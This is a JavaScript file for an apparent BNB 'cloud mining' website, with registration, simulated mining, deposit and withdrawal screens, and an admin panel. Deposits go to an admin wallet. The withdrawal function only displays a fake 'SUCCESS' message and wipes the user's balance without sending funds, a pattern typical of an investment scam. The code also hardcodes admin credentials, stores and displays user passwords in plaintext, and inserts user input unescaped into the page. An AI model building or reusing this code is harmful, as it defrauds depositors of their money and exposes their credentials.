/* ===== ELEMENTS ===== */
const auth = document.getElementById("auth");
const dashboard = document.getElementById("dashboard");
const adminPanel = document.getElementById("adminPanel");

const ADMIN_USER = "HG";
const ADMIN_PASS = "9491";

let currentUser = null;
let ADMIN_WALLET = localStorage.getItem("adminWallet") || "0xBNB_ADMIN_WALLET";

/* ===== STORAGE ===== */
function users(){
  return JSON.parse(localStorage.getItem("users") || "{}");
}
function save(u){
  localStorage.setItem("users", JSON.stringify(u));
}

/* ===== REGISTER ===== */
function register(){
  let id = userId.value.trim();
  let pass = password.value;

  if(!id || !pass){
    alert("Fill all fields");
    return;
  }

  let u = users();
  if(u[id]){
    alert("User already exists");
    return;
  }

  u[id] = {
    password: pass,
    balance: 0,
    speed: 0.00001,
    mining: false,
    blocked: false,
    online: false
  };

  save(u);
  alert("Registration successful");
}

/* ===== LOGIN ===== */
function login(){
  let id = userId.value.trim();
  let pass = password.value;

  /* ADMIN LOGIN */
  if(id === ADMIN_USER && pass === ADMIN_PASS){
    auth.classList.add("hidden");
    adminPanel.classList.remove("hidden");
    loadAdmin();
    return;
  }

  let u = users();
  if(!u[id] || u[id].password !== pass){
    alert("Invalid login");
    return;
  }

  if(u[id].blocked){
    alert("Account blocked by admin");
    return;
  }

  currentUser = id;
  u[id].online = true;
  save(u);

  auth.classList.add("hidden");
  dashboard.classList.remove("hidden");
  updateUI();
}

/* ===== DASHBOARD ===== */
function updateUI(){
  let u = users()[currentUser];
  balance.innerText = u.balance.toFixed(5);
  speed.innerText = u.speed;
}

/* ===== MINING ===== */
function startMining(){
  let u = users();

  if(u[currentUser].mining){
    alert("Mining already running");
    return;
  }

  u[currentUser].mining = true;
  save(u);

  startBtn.classList.add("hidden");
  depositBtn.classList.remove("hidden");
  withdrawBtn.classList.remove("hidden");

  /* DEMO: 24h = 3 seconds */
  setTimeout(()=>{
    let data = users();
    data[currentUser].balance += data[currentUser].speed;
    data[currentUser].speed = 0.5;
    data[currentUser].mining = false;
    save(data);
    updateUI();
    alert("24h mining completed");
  },3000);
}

/* ===== DEPOSIT ===== */
function showDeposit(){
  depositBox.classList.remove("hidden");
  withdrawBox.classList.add("hidden");

  depositBox.innerHTML = `
    <b>Admin Wallet (BNB Smart Chain)</b><br>
    <input value="${ADMIN_WALLET}" readonly
    onclick="this.select();document.execCommand('copy')">
    <small>Tap to copy wallet address</small>
  `;
}

/* ===== WITHDRAW ===== */
function showWithdraw(){
  withdrawBox.classList.remove("hidden");
  depositBox.classList.add("hidden");

  withdrawBox.innerHTML = `
    <input id="wAddr" placeholder="Your BNB Address">
    <button onclick="withdraw()">Confirm Withdraw</button>
    <small>
      Warning: Wrong address = funds lost<br>
      Network: BNB Smart Chain
    </small>
  `;
}

function withdraw(){
  let addr = document.getElementById("wAddr").value;
  if(!addr){
    alert("Enter wallet address");
    return;
  }

  withdrawBox.innerHTML = "PENDING...";

  /* 1 minute pending */
  setTimeout(()=>{
    withdrawBox.innerHTML =
      "SUCCESS ✔<br>Funds will arrive within 24 hours.";

    let u = users();
    u[currentUser].balance = 0;
    u[currentUser].speed = 0.00001;
    save(u);
    updateUI();
  },60000);
}

/* ===== ADMIN ===== */
function loadAdmin(){
  let u = users();
  let html = "";

  for(let x in u){
    html += `
      <div class="box">
        <b>${x}</b><br>
        Password: ${u[x].password}<br>
        Balance: $${u[x].balance}<br>
        Online: ${u[x].online}<br>
        <button onclick="boost('${x}',10)">24h $10</button>
        <button onclick="boost('${x}',30)">24h $30</button>
        <button onclick="blockUser('${x}')">Block</button>
        <button onclick="deleteUser('${x}')">Delete</button>
      </div>
    `;
  }

  adminUsers.innerHTML = html;
}

function boost(user,val){
  let u = users();
  u[user].speed = val;
  save(u);
  loadAdmin();
}

function blockUser(user){
  let u = users();
  u[user].blocked = true;
  save(u);
  loadAdmin();
}

function deleteUser(user){
  let u = users();
  delete u[user];
  save(u);
  loadAdmin();
}

/* ===== LOGOUT (KAN SAXDA AH) ===== */
function logout(){
  let u = users();

  if(currentUser && u[currentUser]){
    u[currentUser].online = false;
    save(u);
  }

  currentUser = null;

  /* Hide all pages */
  dashboard.classList.add("hidden");
  adminPanel.classList.add("hidden");

  /* Show login */
  auth.classList.remove("hidden");

  /* Clear fields */
  userId.value = "";
  password.value = "";
}
